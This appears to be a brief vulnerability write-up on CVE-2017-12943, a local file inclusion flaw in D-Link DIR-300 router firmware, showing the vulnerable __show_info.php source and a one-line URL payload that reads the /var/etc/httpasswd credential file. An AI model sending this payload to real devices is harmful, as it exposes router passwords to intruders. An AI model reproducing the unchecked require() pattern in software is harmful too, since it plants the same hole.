Ref:
https://www.52pojie.cn/thread-1572565-1-1.html#41264230_2%E3%80%81dir600
https://paper.seebug.org/429/#d-link-dir-300-dir-320-dir-600-dir-615


# D-Link DIR-300 

__show_info_php

Payload `__show_info.php?REQUIRE_FILE=/var/etc/httpasswd`

```php

<?

if($REQUIRE_FILE == "var/etc/httpasswd" || $REQUIRE_FILE == "var/etc/hnapasswd")
{
	echo "<title>404 Not Found</title>\n";
	echo "<h1>404 Not Found</h1>\n";
}
else
{
if($REQUIRE_FILE!="")
{
require($LOCALE_PATH."/".$REQUIRE_FILE);
}
else
{
echo $m_context;
echo $m_context2;//jana added
if($m_context_next!="")
{
	echo $m_context_next;
}
echo "
\n";

if($USE_BUTTON=="1")
	{echo "<input type=button name='bt' value='".$m_button_dsc."' onclick='click_bt();'>\n"; }
	}

}

?>
```


# CVE-2017-12943

__show_info.php

Payload `__show_info.php?REQUIRE_FILE=/var/etc/httpasswd`

`$REQUIRE_FILE` can be control, `require($LOCALE_PATH."/".$REQUIRE_FILE)`, `LOCATE_PATH` default was empty

```php=
<body onload="init();" <?=$G_BODY_ATTR?>>
<form name="frm" id="frm">
<?require("/www/model/__banner.php");?>
<table <?=$G_MAIN_TABLE_ATTR?>>
<tr valign=middle align=center>
    <td>

<!-- ________________________________ Main Content Start ______________________________ -->
    <table width=90%>
    <tr>
        <td id="box_header">
            <h1><?=$m_context_title?></h1>

            <center>
            <?
            if($REQUIRE_FILE!="")
            {
                require($LOCALE_PATH."/".$REQUIRE_FILE);
            }
            else
            {
                echo $m_context;
                echo $m_context2;//jana added
                if($m_context_next!="")
                {
                    echo $m_context_next;
                }
                echo "

\n";
                if($USE_BUTTON=="1")
                {echo "<input type=button name='bt' value='".$m_button_dsc."' onclick='click_bt();'>\n"; }
            }
            ?>
            </center>

        </td>
    </tr>
    </table>
<!-- ________________________________  Main Content End _______________________________ -->

    </td>
</tr>
</table>
<?require("/www/model/__tailer.php");?>
</form>
</body>
</html>
<?
for ("/sys/user")
{
    if (query("name")!="")
    {
        echo query("name").":".query("password")."\n";
    }
}
?>
```